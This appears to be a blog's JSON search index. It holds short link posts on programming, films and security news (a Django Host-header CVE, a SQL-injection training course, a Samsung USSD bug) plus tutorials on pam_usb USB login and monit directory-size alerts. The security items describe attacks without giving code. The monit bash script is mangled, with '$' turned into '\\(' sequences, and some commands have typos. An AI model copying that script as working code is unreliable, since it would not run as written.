= \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); }","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/12/15/subdominios-dinamicos-en-un-alojamiento-con-dominio-dinamico-en-ovh/","loc":"https://karpoke.ignaciocano.com/2012/12/15/subdominios-dinamicos-en-un-alojamiento-con-dominio-dinamico-en-ovh/"},{"title":"Lista de páginas recomendadas para aprender inglés","text":"A continuación os pongo una serie de páginas webs que considero imprescindibles en caso de tener cualquier tipo de duda. Se incluyen tanto páginas en castellano como en inglés, y junto a la página una pequeña descripción de lo que podéis encontrar en ella. Espero que os resulte útil. Alber | eingleses.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/12/lista-de-paginas-recomendadas-para-aprender-ingles/","loc":"https://karpoke.ignaciocano.com/2012/12/12/lista-de-paginas-recomendadas-para-aprender-ingles/"},{"title":"Una abadía con muros de plata","text":"Tiene veinticinco años y es, posiblemente, la `abadía' más joven de las que pueblan el territorio español aunque su ubicación no es exacta: vive en todos y cada uno de los microordenadores de 8 bits que un día la alojaron en sus monitores. La Abadía del Crimen cumple un cuarto siglo y lo hace como uno de los referentes máximos del videojuego español y convertida en un objeto de culto tanto para aquellos que pudieron catarla en su día como para aquellos que la han descubierto con unos años de retraso. Jaume Esteve | elmundo.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/12/12/una-abadia-con-muros-de-plata/","loc":"https://karpoke.ignaciocano.com/2012/12/12/una-abadia-con-muros-de-plata/"},{"title":"Powerful Command Line Tools For Developers","text":"Good tools are invaluable in figuring out where problems lie, and can also help to prevent problems from occurring in the first place, or just help you to be more efficient in general. Command line tools are particularly useful because they lend themselves well to automation and scripting, where they can be combined and reused in all sorts of different ways. Here we cover six particularly powerful and versatile tools which can help make your life a little bit easier. Ben Dowling | smashingmagazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/11/03/powerful-command-line-tools-for-developers/","loc":"https://karpoke.ignaciocano.com/2012/11/03/powerful-command-line-tools-for-developers/"},{"title":"IMDB Top 250 in 2 1/2 Minutes","text":"This is one incredible list of films/movies. If Peter Weyland wanted David to learn about cinema while the crew of Prometheus was still in hyper sleep, he'd probably have him go down the IMDB Top 250. This list does change infrequently, and I began the project over a month prior to November 1, 2012, so attention to my haters...Yes...I KNOW some of these movies are not on the top 250. 53 Titles to be exact (as of 11/1/12). However, none of my haters can tell me that any of these 303 titles do not exist on IMDB. Jonathan Keogh | youtube.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/11/03/imdb-top-250-in-2-12-minutes/","loc":"https://karpoke.ignaciocano.com/2012/11/03/imdb-top-250-in-2-12-minutes/"},{"title":"La idea matemática que hizo volar al Voyager","text":"La sonda espacial Voyager ha cautivado al mundo con su proeza en los confines del Sistema Solar, pero su lanzamiento en 1977 sólo fue posible gracias a las ideas matemáticas y la persistencia de un estudiante de doctorado que descubrió cómo catapultar sondas al espacio. Christopher Riley y Dallas Campbell | bbc.co.uk","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/30/la-idea-matematica-que-hizo-volar-al-voyager/","loc":"https://karpoke.ignaciocano.com/2012/10/30/la-idea-matematica-que-hizo-volar-al-voyager/"},{"title":"Por Que Tu Cámara No Importa","text":"¿Porqué es que fotógrafos cargados con los artefactos más extraordinarios, que inclusive usan Internet para conseguir las coordenadas exactas de G.P.S donde Jack o Ansel sacaban sus fotos, llegando hasta esas ubicaciones geográficas con la imagen en la mano para poder sacar una copia igual (ilegal por el Derecho Registral de los EE.UU. y por el sentido común), consiguen algo que puede parecer similar, pero que carece de todo el impacto y la emoción del original que creyeron copiar? Ken Rockwell | kenrockwell.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/30/por-que-tu-camara-no-importa/","loc":"https://karpoke.ignaciocano.com/2012/10/30/por-que-tu-camara-no-importa/"},{"title":"Transformada de Fourier discreta en Python con SciPy","text":"En este artículo vamos a ver cómo calcular la transformada de Fourier discreta (o DFT) de una señal en Python utilizando la transformada rápida de Fourier (o FFT) implementada en SciPy. El análisis de Fourier es la herramienta fundamental en procesamiento de señales y resulta útil en otras áreas como en la resolución de ecuaciones diferenciales o en el tratamiento de imágenes. Juanlu001 | pybonacci.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/29/transformada-de-fourier-discreta-en-python-con-scipy/","loc":"https://karpoke.ignaciocano.com/2012/10/29/transformada-de-fourier-discreta-en-python-con-scipy/"},{"title":"A Field Guide To Mobile App Testing","text":"Testers are often thought of as people who find bugs, but have you ever considered how testers actually approach testing? Do you ever wonder what testers actually do, and how they can add value to a typical technology project? I'd like to take you through the thought process of testers and discuss the types of things they consider when testing a mobile app. The intention here is to highlight their thought processes and to show the coverage and depth that testers often go to. Rosie Sherry | smashingmagazine.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/28/a-field-guide-to-mobile-app-testing/","loc":"https://karpoke.ignaciocano.com/2012/10/28/a-field-guide-to-mobile-app-testing/"},{"title":"High Resolution Time","text":"This specification defines a JavaScript interface that provides the current time in sub-millisecond resolution and such that it is not subject to system clock skew or adjustments. Jatinder Mann | w3.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/28/high-resolution-time/","loc":"https://karpoke.ignaciocano.com/2012/10/28/high-resolution-time/"},{"title":"Envenenamiento de cabeceras en Django 1.3 y 1.4","text":"Django, framework de desarrollo web basado en Python ha actualizado las ramas 1.3 y 1.4 para dar solución a una vulnerabilidad que podría, mediante técnicas de envenenamiento de cabeceras (\"Header poisoning\"), redireccionar a un usuario a un sitio malicioso o incluso el robo de credenciales. Para realizar algunas operaciones, Django extrae el nombre del dominio de la cabecera \"Host\" enviada. La vulnerabilidad (CVE-2012-4520) reside en el parser del método django.http.HttpRequest.get_host(), que extrae esta cabecera \"Host\" incorrectamente. Antonio Sánchez | unaaldia.hispasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/28/envenenamiento-de-cabeceras-en-django-1-3-y-1-4/","loc":"https://karpoke.ignaciocano.com/2012/10/28/envenenamiento-de-cabeceras-en-django-1-3-y-1-4/"},{"title":"Automating with convention: Introducing sub","text":"When I started my on-call shifts, we had pretty little in the way of automation for day-to-day issues. Tasks like SSH'ing into our cluster, starting a Rails console, or doing a deep search through our gigantic mail directories, were either shelved away in someone's bashrc, history log, or just ingrained into someone's memory. This pain was also felt by a few other of my fellow programmers, and we started cobbling together a Git repo simply named \"37s shell scripts\". This repo started very innocently: a little Ruby script named console that mapped a product name (basecamp) to a server name inside of our cluster (jobs-03), SSH'd in, and then ran a production Rails console. Several more bash and Ruby scripts started to trickle in as we started to share more of our personal code that we used when on-call. Eventually Sam laid down a foundation of bash scripts and directories borrowed from rbenv, and dubbed it \"37\". Nick | 37signals.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/28/automating-with-convention-introducing-sub/","loc":"https://karpoke.ignaciocano.com/2012/10/28/automating-with-convention-introducing-sub/"},{"title":"A dash of algebra on wireless networks promises to boost bandwidth tenfold, without new infrastructure","text":"Academic researchers have improved wireless bandwidth by an order of magnitude\"not by adding base stations, tapping more spectrum, or cranking up transmitter wattage, but by using algebra to eliminate the network-clogging task of resending dropped packets of data. By providing new ways for mobile devices to solve for missing data, the technology not only eliminates this wasteful process but also can seamlessly weave data streams from Wi-Fi and LTE\"a leap forward from other approaches that toggle back and forth. \"Any IP network will benefit from this technology,\" says Sheau Ng, vice president for research and development at NBC Universal. David Talbot | technologyreview.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/28/a-dash-of-algebra-on-wireless-networks-promises-to-boost-bandwidth-tenfold-without-new-infrastructure/","loc":"https://karpoke.ignaciocano.com/2012/10/28/a-dash-of-algebra-on-wireless-networks-promises-to-boost-bandwidth-tenfold-without-new-infrastructure/"},{"title":"Stable Linux kernel hit by ext4 data corruption bug","text":"Linux kernel developer Theodore \"Ted\" Ts'o has released a series of patches for what he has called \"a Lance Armstrong bug\" in the kernel, meaning behaviour that does not trip up tests but nevertheless makes the kernel work differently than intended. A user had reported a problem that caused data loss; the kernel developers quickly narrowed this down to a fault in the ext4 implementation that was introduced with the release of Linux 3.6.2 just over a week ago. Apparently, the data corruption bug was hard to track down as it only manifests itself if a system is rebooted twice in a relatively short period of time. » h-online.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/26/stable-linux-kernel-hit-by-ext4-data-corruption-bug/","loc":"https://karpoke.ignaciocano.com/2012/10/26/stable-linux-kernel-hit-by-ext4-data-corruption-bug/"},{"title":"Pocos elementos forman sistemas complejos en el mundo físico, biológico o digital","text":"Cuando observamos el mundo físico que nos rodea, nos maravillamos de su extrema variedad y complejidad. Al examinar el mundo vivo no deja de sorprendernos la riqueza de animales y plantas que encontramos por doquier. Sería iluso pretender leer los libros que se han escrito en la historia. La música ofrece una enorme repertorio de temas que escuchar. Y el mundo digital sorprende por la desbordante cantidad de contenidos que nos presenta. Pero todos estos complejos mundos tienen algo en común: están compuestos por una pequeña cantidadde elementos combinados en gigantescos números . Antonio Orbe | alt1040.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/20/pocos-elementos-forman-sistemas-complejos-en-el-mundo-fisico-biologico-o-digital/","loc":"https://karpoke.ignaciocano.com/2012/10/20/pocos-elementos-forman-sistemas-complejos-en-el-mundo-fisico-biologico-o-digital/"},{"title":"The History of Film","text":"This graphic chronicles the history of feature films from the origins in the 1910s until the present day. More than 2000 of the most important feature-length films are mapped into 20 genres spanning 100 years. Films selected to be included have: won important awards such as the best picture Academy Award; achieved critical acclaim according to recognized film critics; are considered to be key genre films by experts; and/or attained box office success. The History of Film was created by Larry Gormley, an award winning designer. » historyshots.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/15/the-history-of-film/","loc":"https://karpoke.ignaciocano.com/2012/10/15/the-history-of-film/"},{"title":"El salto de Felix Baumgartner en Python","text":"Supongo que todos estáis al tanto de la hazaña de Felix Baumgartner, el hombre que ha saltado desde una altura de más de 120000 pies desde un globo, convirtiéndose en el hombre que más alto ha saltado y el que ha alcanzado la mayor velocidad sin ayuda mecánica como parte de la misión Red Bull Stratos. En Pybonacci somos tan frikis, que vamos a visualizar el salto supersónico de Baumgartner como mejor se nos da: con Python ;) Nota: Esto es un artículo recreativo que he escrito en un par de horas y he hecho unas cuantas suposiciones que no tienen porqué coincidir con la realidad. Tómese esto en cuenta a la hora de valorar los resultados. Juanlu001 | pybonacci.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/15/el-salto-de-felix-baumgartner-en-python/","loc":"https://karpoke.ignaciocano.com/2012/10/15/el-salto-de-felix-baumgartner-en-python/"},{"title":"SOLID CSS","text":"CSS was meant to style academic documents and simple sites (eg. wiki, blogs) where the cascade and descendant selectors makes a lot of sense. Unfortunately many sites we build nowadays are way more complex than that, and what used to work on simple projects doesn't scale very well. We need to find smarter ways to code CSS to avoid the common issues and re-think the way we do our work. We should learn from the experience of other devs working in different domains, and apply into our own domain. Things like separation of concerns, modularity, encapsulation, DRY can (and should) be applied to large scale CSS projects as well. The main problem is that most people who are good at CSS doesn't necessarily have a Computer Science background, most of them started as designers and learned CSS by themselves (that was my case¦). That's the main reason why I'm writing this post. I won't get into too much details/examples but will try to explain briefly each concept. Some of the SOLID principles are open to multiple interpretations on the CSS context - since we are shoehorning the concepts - that's one of the reasons why I decided to not give detailed examples. I also think we should understand the idea and not be tied to a specific implementation. Miller Medeiros | millermedeiros.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/09/solid-css/","loc":"https://karpoke.ignaciocano.com/2012/10/09/solid-css/"},{"title":"Android, iOS, tiempos de respuestas y por qué nada es gratis en sistemas informáticos","text":"Apple tomó muchas decisiones técnicas con el objetivo de mejorar la \"experiencia de usuario\", pero por sí mismas serían inútiles -o más perjudiciales- si no van acompañadas de medidas de control estrictas. Es fundamental el papel de los controles de las aplicaciones en el App Store (¡ojo! no los justifico). Independientemente de otras consideraciones políticas, dado su simplicidad y soluciones ad hoc, el iOS sería muy fácil de \"abusar\" por los desarrolladores y aplicaciones. Por el contrario, Android es una plataforma abierta que puede user cualquier fabricante, que permite la instalación de cualquier aplicación. El control de aplicaciones del Market por parte de Google es prácticamente inexistente. Esto hace que no valgan soluciones ad hoc, obliga a implementar en el sistema operativo medidas de seguridad y control \"canónicas\", en el sentido que mantenga las condiciones fundamentales de todo sistema operativo de propósito general: eficiencia, equidad (fairness) y seguridad. Ricardo Galli | gallir.wordpress.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/09/android-ios-tiempos-de-respuestas-y-por-que-nada-es-gratis-en-sistemas-informaticos/","loc":"https://karpoke.ignaciocano.com/2012/10/09/android-ios-tiempos-de-respuestas-y-por-que-nada-es-gratis-en-sistemas-informaticos/"},{"title":"Bash One-Liners Explained, Part III: All about redirections","text":"Working with redirections in bash is really easy once you realize that it's all about manipulating file descriptors. When bash starts it opens the three standard file descriptors: stdin (file descriptor 0), stdout (file descriptor 1), and stderr (file descriptor 2). You can open more file descriptors (such as 3, 4, 5, ...), and you can close them. You can also copy file descriptors. And you can write to them and read from them. File descriptors always point to some file (unless they're closed). Usually when bash starts all three file descriptors, stdin, stdout, and stderr, point to your terminal. The input is read from what you type in the terminal and both outputs are sent to the terminal. Peteris Krumins | catonmat.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/09/bash-one-liners-explained-part-iii-all-about-redirections/","loc":"https://karpoke.ignaciocano.com/2012/10/09/bash-one-liners-explained-part-iii-all-about-redirections/"},{"title":"Using footnote in tables","text":"Have you ever tried to add a footnote to a table inside the tabular environment? Even though the index is printed, the search for the actual footnote will be in vain. Tom | texblog.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/09/using-footnote-in-tables/","loc":"https://karpoke.ignaciocano.com/2012/10/09/using-footnote-in-tables/"},{"title":"From SQL injection to shell","text":"This course details the exploitation of SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages. Then, using this access, the attacker will be able to gain code execution on the server. The attack is divided into 3 steps: Fingerprinting: to gather information on the web application and technologies in use. Detection and exploitation of SQL injection: in this part, you will learn how SQL injections work and how to exploit them in order to retrieve information. Access to the administration pages and code execution: the last step in which you will access the operating system and run commands. » pentesterlab.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/08/from-sql-injection-to-shell/","loc":"https://karpoke.ignaciocano.com/2012/10/08/from-sql-injection-to-shell/"},{"title":"f2fs: introduce flash-friendly file system","text":"NAND flash memory-based storage devices, such as SSD, eMMC, and SD cards, have been widely being used for ranging from mobile to server systems. Since they are known to have different characteristics from the conventional rotational disks, a file system, an upper layer to the storage device, should adapt to the changes from the sketch. F2FS is a new file system carefully designed for the NAND flash memory-based storage devices. We chose a log structure file system approach, but we tried to adapt it to the new form of storage. Also we remedy some known issues of the very old log structured file system, such as snowball effect of wandering tree and high cleaning overhead. Because a NAND-based storage device shows different characteristics according to its internal geometry or flash memory management scheme aka FTL, we add various parameters not only for configuring on-disk layout, but also for selecting allocation and cleaning algorithms. Jaegeuk Kim | lkml.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/06/f2fs-introduce-flash-friendly-file-system/","loc":"https://karpoke.ignaciocano.com/2012/10/06/f2fs-introduce-flash-friendly-file-system/"},{"title":"Recopilación de relojes matemáticos","text":"El tiempo... ese bien tan preciado para muchos, tan desperdiciado por la mayoría... Eso que los relojes nos ayudan a medir o controlar a diario. Hablemos de relojes. Los hay de muchísimos tipos: de muñeca, de pared, analógicos, digitales, con números arábigos, con números romanos, o hasta sin números. Y, evidentemente, los hay con motivos friki-matemáticos. Y de esos son los que vamos a ver a continuación, de relojes matemáticos. &#94;DiAmOnD&#94; | gaussianos.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/05/recopilacion-de-relojes-matematicos/","loc":"https://karpoke.ignaciocano.com/2012/10/05/recopilacion-de-relojes-matematicos/"},{"title":"Lostalgic","text":"This project is based on the entire ABC's LOST TV show scripts, 115 episodes in 7 seasons, that I managed to parse from Lostpedia. I also parsed this page with additional information about hidden characters relations. My aim for this project is not (only) to visualize some properties and patterns out of the script but actually to allow to read and enjoy the series in a different way. I plan to add new views (will inform through twitter), more aimed to reveal global patterns in the script, and I will include cliffhangers and writing teams information. Find more information about Lostalgic in this great article and interview by Greg J. Smith in Creative Applications. This project is dedicated to the Lost writers, to the open culture and, in particular, to the community that built Lostpedia. Santiago Ortiz | intuitionanalytics.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/05/lostalgic/","loc":"https://karpoke.ignaciocano.com/2012/10/05/lostalgic/"},{"title":"HoneyMap","text":"You are looking at the HoneyMap, a real-time world map which visualizes attacks captured by honeypots of the Honeynet Project. Red markers on the map represent attackers, yellow markers are targets (honeypot sensors). Florian Weingarte and Mark Schloesser | HoneyMap / honeynet.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/10/01/honeymap/","loc":"https://karpoke.ignaciocano.com/2012/10/01/honeymap/"},{"title":"Autenticación hardware mediante un USB","text":"pam_usb es un módulo que permite añadir autenticación hardware utilizando unidades de almacenamiento extraíbles \"normales\", como memorias USB, tarjetas SD/MMC, etc. Mediante pamusb podemos especificar que se ejecuten diversas acciones cuando reconoce el dispositivo conectado, como por ejemplo iniciar sesión sin tener que introducir la contraseña o desactivar el salvapantallas, por lo que se puede utilizar para implantar un sistema de autenticación en dos pasos (2FA) . Sirve cualquier USB, ya que el módulo no modifica su contenido, sino que comprueba el UUID, el número de serie, el fabricante y el modelo, por lo que, aunque se copie, no se podrá suplantar fácilmente. Instalación Instalamos el módulo: bash $ api libpam-usb pamusb-tools Configuración USBs Una vez conectado el USB que pensamos utilizar, aunque no hace falta que esté montado, lo añadimos al archivo de configuración /etc/pamusb.conf (podemos asignarle cualquier nombre): ```bash $ sudo pamusb-conf --add-device myusb Please select the device you wish to add. * Using \"Kingston Aurum (136C0932618F)\" (only option) Which volume would you like to use for storing data ? * Using \"/dev/sdb1 (UUID: 37AD-8A2F)\" (only option) Name : myusb Vendor : Kingston Model : Aurum Serial : 136C0932618F UUID : 37AD-8A2F Save to /etc/pamusb.conf ? [Y/n] Y Done. ``` Deberemos repetir el proceso para cada USB que queramos utilizar. Usuarios El siguiente paso es configurar los usuarios que queremos que se autentiquen: ```bash $ sudo pamusb-conf --add-user myuser Which device would you like to use for authentication ? * Using \"myusb\" (only option) User : myuser Device : myusb Save to /etc/pamusb.conf ? [Y/n] Y Done. ``` Comprobación Comprobamos la configuración, todavía con el USB conectado: bash $ sudo pamusb-check myuser * Authentication request for user \"m\" (pamusb-check) * Device \"myusb\" is connected (good). * Performing one time pad verification... * Regenerating new pads... * Access granted. Si desconectamos el USB y volvemos a probar: bash $ sudo pamusb-check myuser * Authentication request for user \"myuser\" (pamusb-check) * Device \"myusb\" is not connected. * Access denied. Módulo PAM Para incluir pam_usb en el proceso de autenticación del sistema, deberemos editar el fichero /etc/pam.d/common-auth y añadir la siguiente linea: bash auth sufficient pam_usb.so antes de la línea: bash auth required pam_unix.so nullok_secure La opción sufficient permite autenticar al usuario si el USB conectado es correcto, y si no lo es continúa con el proceso de autenticación, es decir, pide la contraseña. Si en su lugar ponemos required se necesitarán ambos, USB y contraseña, para acceder al sistema. Si sólo queremos utilizar este sistema de autenticación para algún módulo concreto, en lugar de usar el ficheo common-auth editamos el fichero correspondiente, por ejemplo lightdm , sshd , sudo , etc. No es necesario reiniciar para que los cambios tengan efecto. Con el USB desconectamos hacemos la siguiente prueba: bash $ su myuser * pam_usb v0.5.0 * Authentication request for user \"myuser\" (su) * Device \"myusb\" is not connected. * Access denied. Contraseña: Lo conectamos y volvemos a probar: bash $ su myser * pam_usb v0.5.0 * Authentication request for user \"myuser\" (su) * Device \"myusb\" is connected (good). * Performing one time pad verification... * Access granted. Agente Si queremos que se ejecute un comando cuando detecte que se ha conectado el USB, editamos el fichero /etc/pamusb.conf , esta vez mediante un editor de texto, y añadimos las siguientes líneas en la sección de configuración de usuario. Hay un ejemplo incluído como el siguiente, aunque está comentado, y lo que hace es activar o desactivar el salvapantallas: bash myusb gnome-screensaver-command --lock gnome-screensaver-command --deactivate Es posible que necesitemos añadir pamusb-agent para que se ejecute al inicio, aunque con Ubuntu Precise Pangolin no me ha hecho falta. Si tenemos un entorno de escritorio, podemos incluirlo a través del menú de Aplicaciones al inicio. Si queremos hacerlo desde el terminal, dependerá de si usamos init o upstart . Upstart Si usamos el sistema upstart , para hacer que se ejecute al inicio, creamos el archivo /etc/init/pamusb-agent.conf : ```bash pamusb-agent - pam_usb event handler pamusb-agent is in charge of executing commands upon USB device insertion (once authenticated through pam_usb) and removal. description \"pamusb-agent background daemon\" start on runlevel [2345] stop on runlevel [!2345] expect fork respawn exec /usr/bin/pamusb-agent ``` Mediante respawn especificamos que se reinicie el proceso si termina de forma inesperada. Vamos al directorio /etc/init.d y creamos el siguiente enlace simbólico: bash $ sudo ln -s /lib/init/upstart-job pamusb-agent init Si utilizamos init , añadimos el siguiente script en el directorio /etc/init.d : ```bash !/usr/bin/env bash /usr/bin/pamusb-agent ``` Le damos permisos de ejecución: bash $ sudo chmod +x /etc/init.d/pamusb-agent Lo añadimos al inicio: bash $ sudo update-rc.d pamusb-agent defaults update-rc.d: warning: /etc/init.d/pamusb-agent missing LSB information update-rc.d: see Adding system startup for /etc/init.d/pamusb-agent ... /etc/rc0.d/K20pamusb-agent -> ../init.d/pamusb-agent /etc/rc1.d/K20pamusb-agent -> ../init.d/pamusb-agent /etc/rc6.d/K20pamusb-agent -> ../init.d/pamusb-agent /etc/rc2.d/S20pamusb-agent -> ../init.d/pamusb-agent /etc/rc3.d/S20pamusb-agent -> ../init.d/pamusb-agent /etc/rc4.d/S20pamusb-agent -> ../init.d/pamusb-agent /etc/rc5.d/S20pamusb-agent -> ../init.d/pamusb-agent Para activarlo sin tener que reiniciar, ejecutamos: bash $ sudo service pamusb-agent start Referencias » pam_usb » Upstart","tags":"admin","url":"https://karpoke.ignaciocano.com/2012/09/30/autenticacion-hardware-mediante-un-usb/","loc":"https://karpoke.ignaciocano.com/2012/09/30/autenticacion-hardware-mediante-un-usb/"},{"title":"Major security vulnerability in some Samsung phones could trigger factory reset via web page","text":"A major security vulnerability has been discovered in some TouchWiz-based Samsung smartphones, including the Galaxy S2 and certain Galaxy S3 models on older firmware. The bug was first demonstrated days ago by security researcher Ravi Borgaonkar at the Ekoparty security conference. It involves the use of a single line of code in a malicious web page to immediately trigger a factory reset without prompting the user, or allowing them to cancel the process. Even more serious is the possibility that this could be paired with a similar glitch to render the user's SIM card inoperable. And as the malicious code is in URI form, it can also be delivered via NFC or QR code. » USSD vulnerability test - Alex Dobie | androidcentral.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/26/major-security-vulnerability-in-some-samsung-phones-could-trigger-factory-reset-via-web-page/","loc":"https://karpoke.ignaciocano.com/2012/09/26/major-security-vulnerability-in-some-samsung-phones-could-trigger-factory-reset-via-web-page/"},{"title":"How To Ask Questions The Smart Way","text":"In the world of hackers, the kind of answers you get to your technical questions depends as much on the way you ask the questions as on the difficulty of developing the answer. This guide will teach you how to ask questions in a way more likely to get you a satisfactory answer. Now that use of open source has become widespread, you can often get as good answers from other, more experienced users as from hackers. This is a Good Thing; users tend to be just a little bit more tolerant of the kind of failures newbies often have. Still, treating experienced users like hackers in the ways we recommend here will generally be the most effective way to get useful answers out of them, too. The first thing to understand is that hackers actually like hard problems and good, thought-provoking questions about them. If we didn't, we wouldn't be here. If you give us an interesting question to chew on we'll be grateful to you; good questions are a stimulus and a gift. Good questions help us develop our understanding, and often reveal problems we might not have noticed or thought about otherwise. Among hackers, \"Good question!\" is a strong and sincere compliment. Eric Steven Raymond | catb.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2012/09/26/how-to-ask-questions-the-smart-way/","loc":"https://karpoke.ignaciocano.com/2012/09/26/how-to-ask-questions-the-smart-way/"},{"title":"Monitorizar el tamaño de un directorio con monit","text":"monit es un herramienta para monitorizar procesos, ficheros, directorios y sistemas de ficheros, que permite enviar alertas cuando suceden eventos tales como que un proceso no arranca, se incrementa la carga del sistema o el uso de memoria por encima de un umbral determinado, se modifican ficheros o directorios, etc. El problema es que, por ahora, no permite controlar que el tamaño de un directorio, es decir, de los ficheros contenidos en él, supere cierto valor. Sin embargo, podemos conseguir este resultado utilizando un script que se ejecute de forma periódica y que modifique la fecha de un fichero concreto mientras el tamaño del directorio sea correcto. Este fichero de control nos servirá para saber cuándo se ha superado el limite. Por ejemplo, vamos a suponer que queremos monitorizar el directorio /var/www/uploads y que monit nos avise si supera los 2 GB. Para saber el tamaño que ocupa el directorio ejecutamos: bash $ du -s /var/www/uploads | awk '{print $1}' # el tamaño está en KB Para comprobar si supera el umbral, podemos ejecutar un script como el siguiente: ```bash !/usr/bin/env bash $1: directory $2: size threshold in MB $3: control filename in monit configuration file [ \\(# -lt 3 ] && exit 1 [ ! -r \"\\) 1\" ] && exit 1 declare -i threshold= \\(((\\) 2*1024)) # MB to KB declare -i size= \\((du -s \"\\) 1\" | awk '{print $1}') # KB if [ \\(size -lt $threshold ]; then touch \"\\) 3\"; fi ``` Lo ejecutamos y comprobamos que funciona correctamente: bash $ sudo ./test_directory_size.sh /var/www/uploads 2000 /var/tmp/monit_dir_uploads $ ls /var/tmp/monit_dir_uploads -rw-r--r-- 1 root root 0 2012-07-22 14:48 /var/tmp/monit_dir_uploads Lo añadimos al cron , por ejemplo cada 10 minutos, y le pasamos los valores adecuados: bash $ sudo crontab -e _/10 _ * _ _ /root/scripts/test_directory_size.sh /var/www/uploads 2000 /var/tmp/monit_dir_uploads > /dev/null 2>&1 La frecuencia dependerá de la urgencia que le asignemos a este evento y las consecuencias que tenga el hecho de que ocurra, así como de otros factores que limiten su aparición. Ahora sólo queda añadir la configuración de monit en el fichero /etc/monit/conf.d/server.conf . Hay que tener en cuenta el tiempo que hemos puesto en el cron a la hora de comprobar la fecha de modificación del fichero. bash check file monit_dir_uploads with path /var/tmp/monit_dir_uploads if timestamp > 15 minutes then alert Reiniciamos monit para que los cambios tengan efecto. Cuando ocurra que el tamaño del directorio supere el umbral, y por tanto el script deje de actualizar el fichero de control, nos llegará un aviso como el siguiente: Timestamp failed Service monit_dir_uploads Date: Sun, 22 Jul 2012 15:08:17 +0200 Action: alert Host: localhost Description: timestamp test failed for /var/tmp/monit_dir_uploads Your faithful employee, monit if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + 